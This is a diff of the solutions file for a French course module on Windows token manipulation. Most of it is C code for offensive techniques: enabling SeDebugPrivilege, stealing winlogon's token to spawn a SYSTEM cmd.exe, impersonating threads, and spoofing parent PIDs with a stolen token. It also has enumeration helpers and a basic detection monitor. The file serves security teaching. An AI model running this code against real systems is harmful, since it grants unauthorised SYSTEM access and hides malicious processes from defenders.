@@ -1,703 +1,229 @@
-═══════════════════════════════════════════════════════════════════
-SOLUTIONS - Module 34 : Token Manipulation
-═══════════════════════════════════════════════════════════════════
+SOLUTIONS - MODULE 34 : WINDOWS TOKEN MANIPULATION
 
-⚠️  Ces solutions sont fournies à des fins éducatives uniquement.
-    Utilisez-les de manière éthique et légale.
+⚠️ AVERTISSEMENT : Architectures pour analyse défensive uniquement.
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 1 : Énumération des privilèges d'un token
-═══════════════════════════════════════════════════════════════════
+SOLUTION 1 : SEDEBUGPRIVILEGE ENABLER
 
-void enumerer_privileges_token(HANDLE hToken) {
-    DWORD dwSize = 0;
-    PTOKEN_PRIVILEGES pPrivileges = NULL;
+Enable SeDebugPrivilege :
+HANDLE hToken;
+TOKEN_PRIVILEGES tp;
+LUID luid;
 
-    // Première passe pour obtenir la taille requise
-    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
+OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
+LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
 
-    pPrivileges = (PTOKEN_PRIVILEGES)malloc(dwSize);
-    if (!pPrivileges) {
-        printf("[-] Erreur allocation mémoire\n");
-        return;
-    }
+tp.PrivilegeCount = 1;
+tp.Privileges[0].Luid = luid;
+tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    if (!GetTokenInformation(hToken, TokenPrivileges, pPrivileges, dwSize, &dwSize)) {
-        printf("[-] Échec GetTokenInformation : %lu\n", GetLastError());
-        free(pPrivileges);
-        return;
-    }
+AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
 
-    printf("\n[+] Nombre de privilèges : %lu\n\n", pPrivileges->PrivilegeCount);
-
-    for (DWORD i = 0; i < pPrivileges->PrivilegeCount; i++) {
-        char szName[256];
-        DWORD dwNameSize = sizeof(szName);
-
-        if (LookupPrivilegeName(NULL, &pPrivileges->Privileges[i].Luid, szName, &dwNameSize)) {
-            printf("Privilège %2lu : %-50s", i + 1, szName);
-
-            DWORD attr = pPrivileges->Privileges[i].Attributes;
-
-            if (attr & SE_PRIVILEGE_ENABLED)
-                printf(" [ACTIVÉ]");
-            else
-                printf(" [DÉSACTIVÉ]");
-
-            if (attr & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
-                printf(" [PAR DÉFAUT]");
-
-            if (attr & SE_PRIVILEGE_REMOVED)
-                printf(" [SUPPRIMÉ]");
-
-            if (attr & SE_PRIVILEGE_USED_FOR_ACCESS)
-                printf(" [UTILISÉ]");
-
-            printf("\n");
-        }
-    }
-
-    free(pPrivileges);
+Vérification :
+if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+    // Privilège pas assigné (pas admin)
 }
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 2 : Activation de privilèges multiples
-═══════════════════════════════════════════════════════════════════
+Multiples privilèges :
+tp.PrivilegeCount = 3;
+LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
+LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &tp.Privileges[1].Luid);
+LookupPrivilegeValue(NULL, SE_TCB_NAME, &tp.Privileges[2].Luid);
 
-BOOL activer_privileges_multiples(HANDLE hToken, const char *privileges[], int count) {
-    TOKEN_PRIVILEGES *pTp = NULL;
-    BOOL success = TRUE;
 
-    // Allouer la structure TOKEN_PRIVILEGES
-    DWORD size = sizeof(TOKEN_PRIVILEGES) + (count - 1) * sizeof(LUID_AND_ATTRIBUTES);
-    pTp = (TOKEN_PRIVILEGES*)malloc(size);
-    if (!pTp) {
-        return FALSE;
+SOLUTION 2 : TOKEN STEALING COMPLET
+
+Trouver processus SYSTEM :
+HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+PROCESSENTRY32 pe32;
+pe32.dwSize = sizeof(PROCESSENTRY32);
+
+Process32First(hSnapshot, &pe32);
+do {
+    if (strcmp(pe32.szExeFile, "winlogon.exe") == 0) {
+        system_pid = pe32.th32ProcessID;
     }
+} while (Process32Next(hSnapshot, &pe32));
 
-    pTp->PrivilegeCount = count;
+OpenProcessToken et DuplicateTokenEx :
+HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, system_pid);
+HANDLE hToken, hNewToken;
 
-    // Récupérer les LUID de tous les privilèges
-    for (int i = 0; i < count; i++) {
-        if (!LookupPrivilegeValue(NULL, privileges[i], &pTp->Privileges[i].Luid)) {
-            printf("[-] Privilège invalide : %s (erreur %lu)\n", privileges[i], GetLastError());
-            success = FALSE;
-            break;
-        }
-        pTp->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
-    }
+OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
+DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+                 SecurityImpersonation, TokenPrimary, &hNewToken);
 
-    if (success) {
-        // Activer tous les privilèges en une seule opération
-        if (!AdjustTokenPrivileges(hToken, FALSE, pTp, 0, NULL, NULL)) {
-            printf("[-] Échec AdjustTokenPrivileges : %lu\n", GetLastError());
-            success = FALSE;
-        } else if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
-            printf("[-] Certains privilèges n'ont pas pu être assignés\n");
+Vérifier integrity level :
+TOKEN_MANDATORY_LABEL label;
+DWORD size;
+GetTokenInformation(hNewToken, TokenIntegrityLevel, &label, sizeof(label), &size);
+DWORD integrity = *GetSidSubAuthority(label.Label.Sid,
+                   *GetSidSubAuthorityCount(label.Label.Sid) - 1);
+// SYSTEM = 0x3000
 
-            // Vérifier individuellement quels privilèges ont échoué
-            for (int i = 0; i < count; i++) {
-                TOKEN_PRIVILEGES tp;
-                tp.PrivilegeCount = 1;
-                tp.Privileges[0] = pTp->Privileges[i];
 
-                if (AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL) &&
-                    GetLastError() != ERROR_NOT_ALL_ASSIGNED) {
-                    printf("[+] %s : OK\n", privileges[i]);
-                } else {
-                    printf("[-] %s : ÉCHEC\n", privileges[i]);
-                }
-            }
-            success = FALSE;
-        } else {
-            printf("[+] Tous les privilèges activés avec succès\n");
-        }
-    }
+SOLUTION 3 : CREATEPROCESS WITH STOLEN TOKEN
 
-    free(pTp);
-    return success;
+Spawn SYSTEM cmd.exe :
+STARTUPINFOW si;
+PROCESS_INFORMATION pi;
+ZeroMemory(&si, sizeof(si));
+si.cb = sizeof(si);
+
+// Nécessite SeImpersonatePrivilege
+CreateProcessWithTokenW(hNewToken, 0, NULL, L"cmd.exe",
+                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+
+Alternative (sans SeImpersonate) :
+CreateProcessAsUserW(hNewToken, NULL, L"cmd.exe",
+                     NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
+                     NULL, NULL, &si, &pi);
+
+Vérification dans cmd :
+whoami  # Devrait afficher NT AUTHORITY\SYSTEM
+
+
+SOLUTION 4 : THREAD IMPERSONATION
+
+Impersonation sans CreateProcess :
+HANDLE hDupToken;
+DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+                 SecurityImpersonation, TokenImpersonation, &hDupToken);
+
+ImpersonateLoggedOnUser(hDupToken);
+
+// Vérifier user impersonaté
+char username[256];
+DWORD size = sizeof(username);
+GetUserNameA(username, &size);
+printf("Impersonated user: %s\n", username);
+
+// Revert
+RevertToSelf();
+
+
+SOLUTION 5 : TOKEN INFORMATION ENUMERATION
+
+TokenUser (SID) :
+TOKEN_USER user;
+DWORD size;
+GetTokenInformation(hToken, TokenUser, &user, sizeof(user), &size);
+char name[256], domain[256];
+DWORD name_size = sizeof(name), domain_size = sizeof(domain);
+SID_NAME_USE sid_type;
+LookupAccountSidA(NULL, user.User.Sid, name, &name_size,
+                  domain, &domain_size, &sid_type);
+
+TokenGroups :
+TOKEN_GROUPS groups;
+GetTokenInformation(hToken, TokenGroups, &groups, sizeof(groups), &size);
+for (DWORD i = 0; i < groups.GroupCount; i++) {
+    // Afficher chaque groupe
 }
 
-// Utilisation :
-const char *privs[] = {
-    SE_DEBUG_NAME,
-    SE_SECURITY_NAME,
-    SE_BACKUP_NAME,
-    SE_RESTORE_NAME,
-    SE_TAKE_OWNERSHIP_NAME
-};
-
-activer_privileges_multiples(hToken, privs, 5);
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 3 : Comparaison de tokens
-═══════════════════════════════════════════════════════════════════
-
-void comparer_tokens(HANDLE hToken1, HANDLE hToken2) {
-    TOKEN_USER user1, user2;
-    DWORD dwSize;
-
-    printf("\n═══ COMPARAISON DE TOKENS ═══\n\n");
-
-    // Comparer les utilisateurs
-    if (GetTokenInformation(hToken1, TokenUser, &user1, sizeof(user1), &dwSize) &&
-        GetTokenInformation(hToken2, TokenUser, &user2, sizeof(user2), &dwSize)) {
-
-        if (EqualSid(user1.User.Sid, user2.User.Sid)) {
-            printf("[=] Utilisateurs : IDENTIQUES\n");
-        } else {
-            printf("[≠] Utilisateurs : DIFFÉRENTS\n");
-
-            char name1[256], domain1[256], name2[256], domain2[256];
-            DWORD nameSize1 = sizeof(name1), domainSize1 = sizeof(domain1);
-            DWORD nameSize2 = sizeof(name2), domainSize2 = sizeof(domain2);
-            SID_NAME_USE sidType;
-
-            if (LookupAccountSid(NULL, user1.User.Sid, name1, &nameSize1,
-                               domain1, &domainSize1, &sidType)) {
-                printf("    Token 1 : %s\\%s\n", domain1, name1);
-            }
-
-            if (LookupAccountSid(NULL, user2.User.Sid, name2, &nameSize2,
-                               domain2, &domainSize2, &sidType)) {
-                printf("    Token 2 : %s\\%s\n", domain2, name2);
-            }
-        }
-    }
-
-    // Comparer les niveaux d'intégrité
-    BYTE buffer1[sizeof(TOKEN_MANDATORY_LABEL) + SECURITY_MAX_SID_SIZE];
-    BYTE buffer2[sizeof(TOKEN_MANDATORY_LABEL) + SECURITY_MAX_SID_SIZE];
-    PTOKEN_MANDATORY_LABEL ptml1 = (PTOKEN_MANDATORY_LABEL)buffer1;
-    PTOKEN_MANDATORY_LABEL ptml2 = (PTOKEN_MANDATORY_LABEL)buffer2;
-
-    if (GetTokenInformation(hToken1, TokenIntegrityLevel, ptml1, sizeof(buffer1), &dwSize) &&
-        GetTokenInformation(hToken2, TokenIntegrityLevel, ptml2, sizeof(buffer2), &dwSize)) {
-
-        DWORD integrity1 = *GetSidSubAuthority(ptml1->Label.Sid,
-                           *GetSidSubAuthorityCount(ptml1->Label.Sid) - 1);
-        DWORD integrity2 = *GetSidSubAuthority(ptml2->Label.Sid,
-                           *GetSidSubAuthorityCount(ptml2->Label.Sid) - 1);
-
-        if (integrity1 == integrity2) {
-            printf("[=] Niveau d'intégrité : IDENTIQUE\n");
-        } else {
-            printf("[≠] Niveau d'intégrité : DIFFÉRENT\n");
-            printf("    Token 1 : %lu\n", integrity1);
-            printf("    Token 2 : %lu\n", integrity2);
-        }
-    }
-
-    // Comparer le type de token
-    TOKEN_STATISTICS stats1, stats2;
-    if (GetTokenInformation(hToken1, TokenStatistics, &stats1, sizeof(stats1), &dwSize) &&
-        GetTokenInformation(hToken2, TokenStatistics, &stats2, sizeof(stats2), &dwSize)) {
-
-        if (stats1.TokenType == stats2.TokenType) {
-            printf("[=] Type de token : IDENTIQUE (%s)\n",
-                   stats1.TokenType == TokenPrimary ? "Primary" : "Impersonation");
-        } else {
-            printf("[≠] Type de token : DIFFÉRENT\n");
-            printf("    Token 1 : %s\n", stats1.TokenType == TokenPrimary ? "Primary" : "Impersonation");
-            printf("    Token 2 : %s\n", stats2.TokenType == TokenPrimary ? "Primary" : "Impersonation");
-        }
-    }
+TokenPrivileges :
+TOKEN_PRIVILEGES privs;
+GetTokenInformation(hToken, TokenPrivileges, &privs, sizeof(privs), &size);
+for (DWORD i = 0; i < privs.PrivilegeCount; i++) {
+    char priv_name[256];
+    DWORD name_len = sizeof(priv_name);
+    LookupPrivilegeNameA(NULL, &privs.Privileges[i].Luid, priv_name, &name_len);
+    printf("%s: %s\n", priv_name,
+           (privs.Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? "ENABLED" : "DISABLED");
 }
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 4 : Clonage de token avec modification
-═══════════════════════════════════════════════════════════════════
-
-HANDLE cloner_token_avec_integrite(HANDLE hSourceToken, DWORD nouveauNiveauIntegrite) {
-    HANDLE hNewToken = NULL;
-
-    // Dupliquer le token
-    if (!DuplicateTokenEx(hSourceToken, TOKEN_ALL_ACCESS, NULL,
-                         SecurityImpersonation, TokenPrimary, &hNewToken)) {
-        printf("[-] Échec DuplicateTokenEx : %lu\n", GetLastError());
-        return NULL;
-    }
-
-    // Créer le SID du nouveau niveau d'intégrité
-    PSID pIntegritySid = NULL;
-    SID_IDENTIFIER_AUTHORITY mandatoryLabelAuth = SECURITY_MANDATORY_LABEL_AUTHORITY;
-
-    if (!AllocateAndInitializeSid(&mandatoryLabelAuth, 1, nouveauNiveauIntegrite,
-                                  0, 0, 0, 0, 0, 0, 0, &pIntegritySid)) {
-        printf("[-] Échec AllocateAndInitializeSid : %lu\n", GetLastError());
-        CloseHandle(hNewToken);
-        return NULL;
-    }
-
-    // Préparer la structure TOKEN_MANDATORY_LABEL
-    TOKEN_MANDATORY_LABEL tml;
-    tml.Label.Attributes = SE_GROUP_INTEGRITY;
-    tml.Label.Sid = pIntegritySid;
-
-    // Modifier le niveau d'intégrité du token
-    if (!SetTokenInformation(hNewToken, TokenIntegrityLevel, &tml,
-                            sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(pIntegritySid))) {
-        printf("[-] Échec SetTokenInformation : %lu\n", GetLastError());
-        FreeSid(pIntegritySid);
-        CloseHandle(hNewToken);
-        return NULL;
-    }
-
-    FreeSid(pIntegritySid);
-
-    printf("[+] Token cloné avec nouveau niveau d'intégrité : %lu\n", nouveauNiveauIntegrite);
-
-    return hNewToken;
-}
-
-// Utilisation :
-HANDLE hLowToken = cloner_token_avec_integrite(hToken, SECURITY_MANDATORY_LOW_RID);
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 5 : Énumération des tokens de tous les processus
-═══════════════════════════════════════════════════════════════════
-
-void enumerer_tokens_processus() {
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        printf("[-] Échec CreateToolhelp32Snapshot\n");
-        return;
-    }
-
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-
-    printf("\n%-8s %-30s %-30s %-15s %-10s\n", "PID", "Processus", "Utilisateur", "Élévation", "Intégrité");
-    printf("═══════════════════════════════════════════════════════════════════════════════════════════\n");
-
-    if (Process32First(hSnapshot, &pe32)) {
-        do {
-            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
-            if (!hProcess) continue;
-
-            HANDLE hToken;
-            if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
-                // Récupérer l'utilisateur
-                TOKEN_USER tokenUser;
-                DWORD dwSize;
-                char userName[256] = "N/A";
-                char domainName[256];
-
-                if (GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &dwSize)) {
-                    DWORD userSize = sizeof(userName);
-                    DWORD domainSize = sizeof(domainName);
-                    SID_NAME_USE sidType;
-
-                    if (LookupAccountSid(NULL, tokenUser.User.Sid, userName, &userSize,
-                                        domainName, &domainSize, &sidType)) {
-                        snprintf(userName, sizeof(userName), "%s\\%s", domainName, userName);
-                    }
-                }
-
-                // Récupérer l'élévation
-                TOKEN_ELEVATION_TYPE elevationType;
-                char elevation[15] = "N/A";
-                if (GetTokenInformation(hToken, TokenElevationType, &elevationType,
-                                       sizeof(elevationType), &dwSize)) {
-                    switch (elevationType) {
-                        case TokenElevationTypeDefault: strcpy(elevation, "Default"); break;
-                        case TokenElevationTypeFull: strcpy(elevation, "Full"); break;
-                        case TokenElevationTypeLimited: strcpy(elevation, "Limited"); break;
-                    }
-                }
-
-                // Récupérer l'intégrité
-                BYTE buffer[sizeof(TOKEN_MANDATORY_LABEL) + SECURITY_MAX_SID_SIZE];
-                PTOKEN_MANDATORY_LABEL ptml = (PTOKEN_MANDATORY_LABEL)buffer;
-                char integrity[10] = "N/A";
-
-                if (GetTokenInformation(hToken, TokenIntegrityLevel, ptml, sizeof(buffer), &dwSize)) {
-                    DWORD integrityLevel = *GetSidSubAuthority(ptml->Label.Sid,
-                                           *GetSidSubAuthorityCount(ptml->Label.Sid) - 1);
-
-                    if (integrityLevel < SECURITY_MANDATORY_LOW_RID) strcpy(integrity, "Untrusted");
-                    else if (integrityLevel < SECURITY_MANDATORY_MEDIUM_RID) strcpy(integrity, "Low");
-                    else if (integrityLevel < SECURITY_MANDATORY_HIGH_RID) strcpy(integrity, "Medium");
-                    else if (integrityLevel < SECURITY_MANDATORY_SYSTEM_RID) strcpy(integrity, "High");
-                    else strcpy(integrity, "System");
-                }
-
-                printf("%-8lu %-30s %-30s %-15s %-10s\n",
-                       pe32.th32ProcessID, pe32.szExeFile, userName, elevation, integrity);
-
-                CloseHandle(hToken);
-            }
-
-            CloseHandle(hProcess);
-
-        } while (Process32Next(hSnapshot, &pe32));
-    }
-
-    CloseHandle(hSnapshot);
-}
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 6 : Token Impersonation avec création de processus
-═══════════════════════════════════════════════════════════════════
-
-BOOL creer_processus_avec_token(DWORD pidSource, const char *commandLine) {
-    HANDLE hProcess = NULL;
-    HANDLE hSourceToken = NULL;
-    HANDLE hPrimaryToken = NULL;
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    BOOL success = FALSE;
-
-    ZeroMemory(&si, sizeof(STARTUPINFO));
-    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-    si.cb = sizeof(STARTUPINFO);
-    si.lpDesktop = "winsta0\\default";
-
-    // Ouvrir le processus source
-    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pidSource);
-    if (!hProcess) {
-        printf("[-] Échec OpenProcess : %lu\n", GetLastError());
-        return FALSE;
-    }
-
-    // Ouvrir le token du processus source
-    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hSourceToken)) {
-        printf("[-] Échec OpenProcessToken : %lu\n", GetLastError());
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-
-    // Dupliquer le token en Primary Token
-    if (!DuplicateTokenEx(hSourceToken, TOKEN_ALL_ACCESS, NULL,
-                         SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
-        printf("[-] Échec DuplicateTokenEx : %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    // Créer le processus avec le token dupliqué
-    if (!CreateProcessAsUser(hPrimaryToken, NULL, (LPSTR)commandLine,
-                            NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
-                            NULL, NULL, &si, &pi)) {
-        printf("[-] Échec CreateProcessAsUser : %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    printf("[+] Processus créé avec succès !\n");
-    printf("    PID : %lu\n", pi.dwProcessId);
-    printf("    Thread ID : %lu\n", pi.dwThreadId);
-
-    success = TRUE;
-
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-
-cleanup:
-    if (hPrimaryToken) CloseHandle(hPrimaryToken);
-    if (hSourceToken) CloseHandle(hSourceToken);
-    if (hProcess) CloseHandle(hProcess);
-
-    return success;
-}
-
-// Utilisation :
-DWORD pidWinlogon = trouver_pid_par_nom("winlogon.exe");
-creer_processus_avec_token(pidWinlogon, "cmd.exe");
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 7 : Détection de token manipulation
-═══════════════════════════════════════════════════════════════════
-
-// Cette solution utilise les Security Auditing APIs de Windows
-
-void monitorer_token_manipulation(DWORD dureeSecondes) {
-    printf("[*] Démarrage du monitoring (durée : %lu secondes)...\n", dureeSecondes);
-    printf("[*] Activation de l'audit de sécurité...\n");
-
-    // Activer l'audit des privilèges
-    HANDLE hToken;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        activer_privilege(hToken, SE_SECURITY_NAME);
-        activer_privilege(hToken, SE_AUDIT_NAME);
-        CloseHandle(hToken);
-    }
-
-    // Configuration de l'audit
-    printf("[*] Configuration de l'audit des événements de sécurité...\n");
-    printf("    - Duplication de tokens\n");
-    printf("    - Activation de privilèges\n");
-    printf("    - Impersonification\n\n");
-
-    // Note : Une implémentation complète nécessiterait :
-    // 1. ETW (Event Tracing for Windows) consumer
-    // 2. Subscription aux événements de sécurité
-    // 3. Parsing des événements 4672, 4673, 4674, 4688
-
-    printf("[*] Monitoring actif...\n");
-    printf("    Appuyez sur CTRL+C pour arrêter\n\n");
-
-    DWORD debut = GetTickCount();
-
-    while ((GetTickCount() - debut) < (dureeSecondes * 1000)) {
-        // Dans une implémentation réelle, ici on traiterait les événements ETW
-        // Pour cet exemple, on simule la détection
-
-        Sleep(1000);  // Vérification chaque seconde
-
-        // Exemple de détection basique : énumération des processus avec SeDebugPrivilege
-        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (hSnapshot != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32 pe32;
-            pe32.dwSize = sizeof(PROCESSENTRY32);
-
-            if (Process32First(hSnapshot, &pe32)) {
-                do {
-                    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
-                    if (hProc) {
-                        HANDLE hTok;
-                        if (OpenProcessToken(hProc, TOKEN_QUERY, &hTok)) {
-                            // Vérifier si SeDebugPrivilege est activé
-                            PRIVILEGE_SET ps;
-                            ps.PrivilegeCount = 1;
-                            ps.Control = PRIVILEGE_SET_ALL_NECESSARY;
-                            LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &ps.Privilege[0].Luid);
-                            ps.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-                            BOOL hasPrivilege;
-                            if (PrivilegeCheck(hTok, &ps, &hasPrivilege) && hasPrivilege) {
-                                // Ne logger que les processus non-système suspects
-                                if (_stricmp(pe32.szExeFile, "lsass.exe") != 0 &&
-                                    _stricmp(pe32.szExeFile, "csrss.exe") != 0) {
-                                    printf("[!] ALERTE : SeDebugPrivilege activé\n");
-                                    printf("    Processus : %s (PID: %lu)\n",
-                                           pe32.szExeFile, pe32.th32ProcessID);
-                                }
-                            }
-
-                            CloseHandle(hTok);
-                        }
-                        CloseHandle(hProc);
-                    }
-                } while (Process32Next(hSnapshot, &pe32));
-            }
-            CloseHandle(hSnapshot);
-        }
-    }
-
-    printf("\n[*] Monitoring terminé\n");
-}
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 8 : Parent PID Spoofing avec token
-═══════════════════════════════════════════════════════════════════
-
-BOOL creer_processus_spoofe(DWORD ppidCible, const char *commandLine) {
-    HANDLE hParentProcess = NULL;
-    HANDLE hParentToken = NULL;
-    HANDLE hToken = NULL;
-    STARTUPINFOEX siex;
-    PROCESS_INFORMATION pi;
-    SIZE_T attributeSize;
-    BOOL success = FALSE;
-
-    ZeroMemory(&siex, sizeof(STARTUPINFOEX));
-    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-    siex.StartupInfo.cb = sizeof(STARTUPINFOEX);
-
-    // Ouvrir le processus parent cible
-    hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION,
-                                 FALSE, ppidCible);
-    if (!hParentProcess) {
-        printf("[-] Échec OpenProcess parent : %lu\n", GetLastError());
-        return FALSE;
-    }
-
-    // Ouvrir et dupliquer le token du parent
-    if (!OpenProcessToken(hParentProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hParentToken)) {
-        printf("[-] Échec OpenProcessToken parent : %lu\n", GetLastError());
-        CloseHandle(hParentProcess);
-        return FALSE;
-    }
-
-    if (!DuplicateTokenEx(hParentToken, TOKEN_ALL_ACCESS, NULL,
-                         SecurityImpersonation, TokenPrimary, &hToken)) {
-        printf("[-] Échec DuplicateTokenEx : %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    // Initialiser la liste d'attributs
-    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
-    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attributeSize);
-
-    if (!InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attributeSize)) {
-        printf("[-] Échec InitializeProcThreadAttributeList : %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    // Définir l'attribut PPID
-    if (!UpdateProcThreadAttribute(siex.lpAttributeList, 0,
-                                   PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                                   &hParentProcess, sizeof(HANDLE),
-                                   NULL, NULL)) {
-        printf("[-] Échec UpdateProcThreadAttribute : %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    // Créer le processus avec PPID spoofé et token volé
-    if (!CreateProcessAsUser(hToken, NULL, (LPSTR)commandLine,
-                            NULL, NULL, FALSE,
-                            CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT,
-                            NULL, NULL, &siex.StartupInfo, &pi)) {
-        printf("[-] Échec CreateProcessAsUser : %lu\n", GetLastError());
-        goto cleanup;
-    }
-
-    printf("[+] Processus créé avec PPID spoofé !\n");
-    printf("    PID : %lu\n", pi.dwProcessId);
-    printf("    PPID (forgé) : %lu\n", ppidCible);
-
-    success = TRUE;
-
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-
-cleanup:
-    if (siex.lpAttributeList) {
-        DeleteProcThreadAttributeList(siex.lpAttributeList);
-        free(siex.lpAttributeList);
-    }
-    if (hToken) CloseHandle(hToken);
-    if (hParentToken) CloseHandle(hParentToken);
-    if (hParentProcess) CloseHandle(hParentProcess);
-
-    return success;
-}
-
-// Utilisation :
-DWORD pidExplorer = trouver_pid_par_nom("explorer.exe");
-creer_processus_spoofe(pidExplorer, "cmd.exe");
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION BONUS : Token Vault
-═══════════════════════════════════════════════════════════════════
-
-#include <time.h>
-
-#define MAX_TOKENS 50
-#define TOKEN_EXPIRATION 300  // 5 minutes
-
-typedef struct {
-    char nom[64];
-    HANDLE hToken;
-    time_t timestamp;
-    BOOL valide;
-} TokenEntry;
-
-TokenEntry g_tokenVault[MAX_TOKENS];
-int g_tokenCount = 0;
-
-BOOL vault_stocker_token(const char *nom, HANDLE hToken) {
-    if (g_tokenCount >= MAX_TOKENS) {
-        printf("[-] Vault plein\n");
-        return FALSE;
-    }
-
-    // Dupliquer le token pour le stockage
-    HANDLE hDuplicated;
-    if (!DuplicateHandle(GetCurrentProcess(), hToken,
-                        GetCurrentProcess(), &hDuplicated,
-                        0, FALSE, DUPLICATE_SAME_ACCESS)) {
-        printf("[-] Échec duplication pour stockage\n");
-        return FALSE;
-    }
-
-    // Stocker
-    strncpy(g_tokenVault[g_tokenCount].nom, nom, sizeof(g_tokenVault[0].nom) - 1);
-    g_tokenVault[g_tokenCount].hToken = hDuplicated;
-    g_tokenVault[g_tokenCount].timestamp = time(NULL);
-    g_tokenVault[g_tokenCount].valide = TRUE;
-
-    g_tokenCount++;
-
-    printf("[+] Token '%s' stocké dans le vault\n", nom);
-    return TRUE;
-}
-
-HANDLE vault_recuperer_token(const char *nom) {
-    for (int i = 0; i < g_tokenCount; i++) {
-        if (g_tokenVault[i].valide && strcmp(g_tokenVault[i].nom, nom) == 0) {
-            // Vérifier l'expiration
-            if ((time(NULL) - g_tokenVault[i].timestamp) > TOKEN_EXPIRATION) {
-                printf("[-] Token '%s' expiré\n", nom);
-                CloseHandle(g_tokenVault[i].hToken);
-                g_tokenVault[i].valide = FALSE;
-                return NULL;
-            }
-
-            // Dupliquer pour retour
-            HANDLE hDuplicated;
-            if (DuplicateHandle(GetCurrentProcess(), g_tokenVault[i].hToken,
-                               GetCurrentProcess(), &hDuplicated,
-                               0, FALSE, DUPLICATE_SAME_ACCESS)) {
-                printf("[+] Token '%s' récupéré du vault\n", nom);
-                return hDuplicated;
-            }
-        }
-    }
-
-    printf("[-] Token '%s' non trouvé\n", nom);
-    return NULL;
-}
-
-void vault_lister_tokens() {
-    printf("\n═══ CONTENU DU VAULT ═══\n\n");
-    printf("%-20s %-10s %-20s\n", "Nom", "État", "Expiration");
-    printf("─────────────────────────────────────────────────\n");
-
-    for (int i = 0; i < g_tokenCount; i++) {
-        if (g_tokenVault[i].valide) {
-            time_t remaining = TOKEN_EXPIRATION - (time(NULL) - g_tokenVault[i].timestamp);
-            printf("%-20s %-10s %ld secondes\n",
-                   g_tokenVault[i].nom,
-                   remaining > 0 ? "Valide" : "Expiré",
-                   remaining > 0 ? remaining : 0);
-        }
-    }
-}
-
-void vault_nettoyer_expires() {
-    int nettoyes = 0;
-
-    for (int i = 0; i < g_tokenCount; i++) {
-        if (g_tokenVault[i].valide) {
-            if ((time(NULL) - g_tokenVault[i].timestamp) > TOKEN_EXPIRATION) {
-                CloseHandle(g_tokenVault[i].hToken);
-                g_tokenVault[i].valide = FALSE;
-                nettoyes++;
-            }
-        }
-    }
-
-    printf("[+] %d tokens expirés nettoyés\n", nettoyes);
-}
-
-═══════════════════════════════════════════════════════════════════
-NOTES FINALES
-═══════════════════════════════════════════════════════════════════
-
-Ces solutions démontrent des techniques avancées de manipulation de
-tokens Windows. Utilisez-les de manière responsable et éthique.
-
-Points importants :
